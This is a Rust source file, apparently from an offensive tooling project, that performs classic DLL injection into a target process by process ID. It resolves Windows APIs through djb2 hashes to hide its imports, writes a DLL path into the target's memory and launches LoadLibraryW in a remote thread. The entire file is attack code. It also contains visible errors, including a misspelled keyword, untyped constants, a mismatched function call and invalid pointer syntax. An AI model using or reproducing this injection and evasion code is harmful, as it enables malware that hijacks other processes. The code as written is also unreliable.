#[cfg(target_os = "windows")]

use std::error::Error;
use windows::Win32::Foundation::GetLastError;
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use hash_resolver::*;

type FnOpenProcess = fn(u32, bool, u32) -> *mut c_void;
type FnVirtualAllocEx = fn(*mut c_void, *mut c_void, u64, u32, u32) -> *mut c_void;
type FnCloseHandle = fn(*mut c_void) -> bool;
type FnWriteProcessMemory = fn(*mut c_void, *mut c_void, *const c_void, u64, *mut u64) -> bool;
type PTHREAD_START_ROUTINE = fn(*mut c_void) -> *const u32;
type FnCreateRemoteThread = fn(*mut c_void, *mut SECURITY_ATTRIBUTES, u64, PTHREAD_START_ROUTINE, *mut c_void, u32, *mut u32) -> *mut c_void;

const PROCESS_VM_WRITE = 0x0020 as u32;
const PROCESS_CREATE_THREAD = 0x0002 as u32;
const MEM_COMMIT = 0x00001000 as u32;
cosnt PAGE_READWRITE = 0x04 as u32;

// Perform classic DLL injection with GetProcAddress, OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread
// Reference: https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection
pub fn classic_dll_injection(pid: u32, dll_path: &str) -> Result<(), Box<dyn Error>> {
    // TODO - Enable SE_PRIVILEGE_ENABLED for current process

    // Get function pointers
    let open_process_ptr: FnOpenProcess = addr_to_func_ptr!(resolve_api(djb2!("OpenProcess"), "Kernel32.dll")?, FnOpenProcess);
    let virtual_alloc_ex_ptr: FnVirtualAllocEx = addr_to_func_ptr!(resolve_api(djb2!("VirtualAllocEx"), "Kernel32.dll")?, FnVirtualAllocEx);
    let close_handle_ptr: FnCloseHandle = addr_to_func_ptr!(resolve_api(djb2!("CloseHandle"), "Kernel32.dll")?, FnCloseHandle);
    let write_process_memory_ptr: FnWriteProcessMemory = addr_to_func_ptr!(resolve_api(djb2!("WriteProcessMemory"), "Kernel32.dll")?, FnWriteProcessMemory);
    let create_remote_thread_ptr: FnCreateRemoteThread = addr_to_func_ptr!(resolve_api(djb2!("CreateRemoteThread"), "Kernel32.dll")?, FnCreateRemoteThread);
    let start_routine: PTHREAD_START_ROUTINE = addr_to_func_ptr!(resolve_api(djb2!("LoadLibraryW"), "Kernel32.dll")?, PTHREAD_START_ROUTINE);

    let dll_path_w = to_wstring(dll_path);

    // Get handle to target process
    let h_process: *mut c_void = open_process_ptr(pid, PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, false, pid);
    if h_process.is_null() {
        Err(format!("Failed to open process ID {}. GetLastError: {}", pid, GetLastError().0))?
    } else {
        println!("Opened handle to process with ID {}", pid);
    }

    // Create buffer in target process memory
    let buf_size: u64 = (dll_path_w.len() * 2) as u64;
    let buffer = virtual_alloc_ex_ptr(h_process, 0 as *mut c_void, buf_size, MEM_COMMIT, PAGE_READWRITE);
    if buffer.is_null() {
        close_handle_ptr(h_process);
        Err(format!("Failed to create buffer in target process memory. GetLastError: {}", GetLastError().0))?
    } else {
        println!("Created buffer in target process memory of size {}.", buf_size);
    }

    // Write DLL path to process memory buffer
    let mut num_written: u64 = 0;
    if !write_process_memory_ptr(h_process, buffer, dll_path_w.as_ptr() as *const c_void, buf_size, *mut num_written) {
        close_handle_ptr(h_process);
        Err(format!("Failed to write DLL path to process memory. GetLastError: {}", GetLastError().0))?
    } else {
        println!("Wrote DLL path to process memory. Bytes written: {}", num_written);
    }

    // Create remote thread to run LoadLibraryW
    let mut thread_id: u32 = 0;
    let h_thread = create_remote_thread_ptr(h_process, 0 as *mut SECURITY_ATTRIBUTES, 0u64, start_routine, buffer, 0, *mut thread_id);


    Ok(())
}

fn to_wstring(value: &str) -> Vec<u16> {
    return value.encode_utf16().chain([0u16]).collect::<Vec<u16>>();
}
